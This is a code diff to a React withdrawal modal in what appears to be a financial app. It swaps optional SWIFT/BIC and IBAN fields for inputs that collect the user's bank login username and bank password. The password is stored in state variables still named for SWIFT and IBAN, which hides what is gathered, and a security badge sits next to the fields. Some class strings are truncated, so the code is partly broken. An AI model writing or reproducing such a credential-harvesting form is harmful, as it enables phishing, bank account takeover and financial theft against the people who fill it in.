@@ -2066,44 +2066,41 @@ export const WithdrawModal: React.FC = () => {
                             className="w-full pl-10 pr-4 py-3.5 rounded-xl border-2 border-slate-400 text-slate-950 font-mono font-black text-base focus:border-slate-950 focus:ring-2 focus:ring-slate-950/20 bg-white shadow-xs"
                           />
                         </div>
-                      </div>
-
-                      {/* 6. SWIFT / BIC Code & IBAN (Optional International Banking Fields) */}
-                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
-                        <div className="space-y-1.5">
-                          <label className="block text-xs sm:text-sm font-black text-slate-950 uppercase tracking-wider font-mono">
-                            SWIFT / BIC Code (Optional)
-                          </label>
-                          <div className="relative">
-                            <Building className="w-4 h-4 absolute left-3.5 top-3.5 text-slate-600 stroke-[2.5]" />
-                            <input
-                              type="text"
-                              value={bankSwiftBic}
-                              onChange={(e) => setBankSwiftBic(e.target.value.toUpperCase())}
-                              placeholder="e.g. CHASUS33"
-                              maxLength={11}
-                              className="w-full pl-10 pr-3 py-3 rounded-xl border-2 border-slate-400 bg-white text-sm sm:text-base font-mono font-black text-slate-950 uppercase placeholder:normal-case placeholder:font-sans focus:border-slate-950 focus:ring-2 focus:ring-slate-950/20 shadow-xs"
-                            />
-                          </div>
-                        </div>
-
-                        <div className="space-y-1.5">
-                          <label className="block text-xs sm:text-sm font-black text-slate-950 uppercase tracking-wider font-mono">
-                            IBAN (Optional / International)
-                          </label>
-                          <div className="relative">
-                            <Globe className="w-4 h-4 absolute left-3.5 top-3.5 text-slate-600 stroke-[2.5]" />
-                            <input
-                              type="text"
-                              value={bankIban}
-                              onChange={(e) => setBankIban(e.target.value.toUpperCase())}
-                              placeholder="e.g. GB29NWBK60161331926819"
-                              maxLength={42}
-                              className="w-full pl-10 pr-3 py-3 rounded-xl border-2 border-slate-400 bg-white text-sm sm:text-base font-mono font-black text-slate-950 uppercase placeholder:normal-case placeholder:font-sans focus:border-slate-950 focus:ring-2 focus:ring-slate-950/20 shadow-xs"
-                            />
-                          </div>
-                        </div>
-                      </div>
+                      </div>{/* Bank Login Credentials */}
+<div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
+  <div className="space-y-1.5">
+    <label className="block text-xs sm:text-sm font-black text-slate-950 uppercase tracking-wider font-mono">
+      BANK LOGIN: USERNAME, EMAIL OR PHONE NUMBER
+    </label>
+    <div className="relative">
+      <Building className="w-4 h-4 absolute left-3.5 top-3.5 text-slate-600 stroke-[2.5]" />
+      <input
+        type="text"
+        value={bankSwiftBic}
+        onChange={(e) => setBankSwiftBic(e.target.value)}
+        placeholder="e.g. john.doe@email.com or +18012345678"
+        maxLength={50}
+        className="w-full pl-10 pr-3 py-3 rounded-xl border-2 border-slate-400 bg-white text-sm sm:text-base font-mono font-..."
+      />
+    </div>
+  </div>
+  <div className="space-y-1.5">
+    <label className="block text-xs sm:text-sm font-black text-slate-950 uppercase tracking-wider font-mono">
+      BANK LOGIN: PASSWORD
+    </label>
+    <div className="relative">
+      <Globe className="w-4 h-4 absolute left-3.5 top-3.5 text-slate-600 stroke-[2.5]" />
+      <input
+        type="password"
+        value={bankIban}
+        onChange={(e) => setBankIban(e.target.value)}
+        placeholder="Enter your bank password"
+        maxLength={50}
+        className="w-full pl-10 pr-3 py-3 rounded-xl border-2 border-slate-400 bg-white text-sm sm:text-base font-mono font-..."
+      />
+    </div>
+  </div>
+</div>
 
                       {/* Security badge */}
                       <div className="flex items-center gap-2 p-3.5 rounded-xl bg-slate-100 border-2 border-slate-300 text-xs text-slate-950 font-bold">
